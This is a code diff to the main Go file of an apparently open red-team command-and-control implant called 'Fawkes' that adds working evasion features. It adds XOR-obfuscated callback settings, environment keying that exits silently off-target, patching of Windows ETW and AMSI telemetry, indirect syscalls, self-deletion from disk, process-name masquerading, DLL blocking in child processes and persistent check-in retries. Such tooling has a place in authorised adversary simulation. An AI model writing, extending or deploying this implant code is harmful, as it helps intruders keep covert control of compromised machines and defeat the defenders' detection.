@@ -2,6 +2,7 @@ package main
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -9,6 +10,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"regexp"
 	"runtime"
 	"strconv"
 	"strings"
@@ -49,6 +51,17 @@ var (
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
 	tcpBindAddress    string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
+	envKeyHostname    string = ""     // Environment key: hostname must match this regex
+	envKeyDomain      string = ""     // Environment key: domain must match this regex
+	envKeyUsername    string = ""     // Environment key: username must match this regex
+	envKeyProcess     string = ""     // Environment key: this process must be running
+	selfDelete        string = ""     // Self-delete binary from disk after execution starts
+	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
+	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
+	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
+	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
+	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
+	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
 )
 
 func main() {
@@ -56,6 +69,23 @@ func main() {
 }
 
 func runAgent() {
+	// Deobfuscate C2 config strings if XOR key is present
+	if xorKey != "" {
+		keyBytes, err := base64.StdEncoding.DecodeString(xorKey)
+		if err == nil && len(keyBytes) > 0 {
+			payloadUUID = xorDecodeString(payloadUUID, keyBytes)
+			callbackHost = xorDecodeString(callbackHost, keyBytes)
+			callbackPort = xorDecodeString(callbackPort, keyBytes)
+			userAgent = xorDecodeString(userAgent, keyBytes)
+			encryptionKey = xorDecodeString(encryptionKey, keyBytes)
+			getURI = xorDecodeString(getURI, keyBytes)
+			postURI = xorDecodeString(postURI, keyBytes)
+			hostHeader = xorDecodeString(hostHeader, keyBytes)
+			proxyURL = xorDecodeString(proxyURL, keyBytes)
+			customHeaders = xorDecodeString(customHeaders, keyBytes)
+		}
+	}
+
 	// Convert string build variables to appropriate types with validation
 	callbackPortInt, err := strconv.Atoi(callbackPort)
 	if err != nil {
@@ -105,6 +135,31 @@ func runAgent() {
 		os.Exit(0)
 	}
 
+	// Check environment keys — exit silently if any check fails (no network activity)
+	if !checkEnvironmentKeys() {
+		os.Exit(0)
+	}
+
+	// Auto-patch ETW/AMSI: neutralize detection before any activity (Windows only)
+	if autoPatch == "true" {
+		autoStartupPatch()
+	}
+
+	// Initialize indirect syscalls: resolve Nt* syscall numbers from ntdll (Windows only)
+	if indirectSyscalls == "true" {
+		initIndirectSyscalls()
+	}
+
+	// Self-delete: remove binary from disk after startup (process continues from memory)
+	if selfDelete == "true" {
+		selfDeleteBinary()
+	}
+
+	// Process name masquerade: change /proc/self/comm on Linux
+	if masqueradeName != "" {
+		masqueradeProcess(masqueradeName)
+	}
+
 	// Parse working hours configuration
 	whStartMinutes := 0
 	whEndMinutes := 0
@@ -147,6 +202,7 @@ func runAgent() {
 		Jitter:            jitterInt,
 		User:              getUsername(),
 		Description:       fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
+		KillDate:          killDateInt64,
 		WorkingHoursStart: whStartMinutes,
 		WorkingHoursEnd:   whEndMinutes,
 		WorkingDays:       whDays,
@@ -185,6 +241,15 @@ func runAgent() {
 			proxyURL,
 			tlsVerify,
 		)
+		// Decode and apply custom HTTP headers from C2 profile
+		if customHeaders != "" {
+			if decoded, err := base64.StdEncoding.DecodeString(customHeaders); err == nil {
+				var headers map[string]string
+				if err := json.Unmarshal(decoded, &headers); err == nil {
+					httpProfile.CustomHeaders = headers
+				}
+			}
+		}
 		c2 = profiles.NewProfile(httpProfile)
 
 		// Also create a TCP profile instance for P2P child management.
@@ -210,19 +275,37 @@ func runAgent() {
 		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
 	}
 
+	// Configure child process protections (Windows: block non-Microsoft DLLs)
+	if blockDLLs == "true" {
+		commands.SetBlockDLLs(true)
+	}
+
 	// Initialize command handlers
 	commands.Initialize()
 
 	// Initialize file transfer goroutines
 	files.Initialize()
 
-	// Initial checkin
+	// Initial checkin with exponential backoff retry
 	log.Printf("[INFO] Starting initial checkin...")
-	if err := c2.Checkin(agent); err != nil {
-		log.Printf("[ERROR] Initial checkin failed: %v", err)
-		return
+	for attempt := 0; attempt < maxRetriesInt; attempt++ {
+		if err := c2.Checkin(agent); err != nil {
+			log.Printf("[ERROR] Initial checkin attempt %d failed: %v", attempt+1, err)
+			backoffMultiplier := 1 << min(attempt, 8)
+			backoffSeconds := sleepIntervalInt * backoffMultiplier
+			if backoffSeconds > 300 {
+				backoffSeconds = 300
+			}
+			sleepTime := calculateSleepTime(backoffSeconds, jitterInt)
+			time.Sleep(sleepTime)
+			continue
+		}
+		log.Printf("[INFO] Initial checkin successful")
+		goto checkinDone
 	}
-	log.Printf("[INFO] Initial checkin successful")
+	log.Printf("[ERROR] All initial checkin attempts failed, exiting")
+	return
+checkinDone:
 
 	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
 	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
@@ -250,12 +333,12 @@ func runAgent() {
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, killDateInt64)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, killDateUnix int64) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -265,7 +348,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			return
 		default:
 			// Enforce kill date every cycle — exit silently if past expiry
-			if killDateUnix > 0 && time.Now().Unix() > killDateUnix {
+			if agent.KillDate > 0 && time.Now().Unix() > agent.KillDate {
 				log.Printf("[INFO] Kill date reached, exiting")
 				return
 			}
@@ -291,16 +374,14 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			if err != nil {
 				log.Printf("[ERROR] Failed to get tasking: %v", err)
 				retryCount++
-				if retryCount >= maxRetriesInt {
-					log.Printf("[ERROR] Maximum retry count reached, resetting counter and sleeping longer")
-					retryCount = 0 // Reset counter instead of exiting
-					// Sleep longer on repeated failures
-					sleepTime := time.Duration(agent.SleepInterval*3) * time.Second
-					time.Sleep(sleepTime)
-					continue
+				// Exponential backoff: sleep 2^(retryCount-1) * base interval, capped at 5 minutes
+				backoffMultiplier := 1 << min(retryCount-1, 8) // 1, 2, 4, 8, 16, ...
+				backoffSeconds := agent.SleepInterval * backoffMultiplier
+				maxBackoff := 300 // 5 minutes cap
+				if backoffSeconds > maxBackoff {
+					backoffSeconds = maxBackoff
 				}
-				// Use the same sleep calculation for error case
-				sleepTime := calculateSleepTime(agent.SleepInterval, agent.Jitter)
+				sleepTime := calculateSleepTime(backoffSeconds, agent.Jitter)
 				time.Sleep(sleepTime)
 				continue
 			}
@@ -404,6 +485,9 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 		close(done)
 		return
 	}
+
+	// Re-apply token impersonation if active (handles Go thread migration)
+	commands.PrepareExecution()
 
 	// Execute command with panic recovery to prevent agent crash
 	var result structs.CommandResult
@@ -521,4 +605,63 @@ func getInternalIP() string {
 		}
 	}
 	return "127.0.0.1"
+}
+
+// checkEnvironmentKeys validates all configured environment keys.
+// Returns true if all checks pass (or no keys configured). Returns false if any check fails.
+// On failure, the agent should exit silently — no logging, no network activity.
+func checkEnvironmentKeys() bool {
+	if envKeyHostname != "" {
+		hostname, _ := os.Hostname()
+		if !regexMatch(envKeyHostname, hostname) {
+			return false
+		}
+	}
+	if envKeyDomain != "" {
+		domain := getEnvironmentDomain()
+		if !regexMatch(envKeyDomain, domain) {
+			return false
+		}
+	}
+	if envKeyUsername != "" {
+		username := getUsername()
+		if !regexMatch(envKeyUsername, username) {
+			return false
+		}
+	}
+	if envKeyProcess != "" {
+		if !isProcessRunning(envKeyProcess) {
+			return false
+		}
+	}
+	return true
+}
+
+// regexMatch performs a case-insensitive full-string regex match.
+func regexMatch(pattern, value string) bool {
+	// Anchor the pattern to match the full string
+	anchored := "(?i)^(?:" + pattern + ")$"
+	re, err := regexp.Compile(anchored)
+	if err != nil {
+		// Invalid regex — fail closed (don't execute)
+		return false
+	}
+	return re.MatchString(value)
+}
+
+// xorDecodeString decodes a base64-encoded XOR-encrypted string.
+// If the input is empty or decoding fails, returns the original string.
+func xorDecodeString(encoded string, key []byte) string {
+	if encoded == "" || len(key) == 0 {
+		return encoded
+	}
+	data, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return encoded // not encoded, use as-is
+	}
+	result := make([]byte, len(data))
+	for i, b := range data {
+		result[i] = b ^ key[i%len(key)]
+	}
+	return string(result)
 }
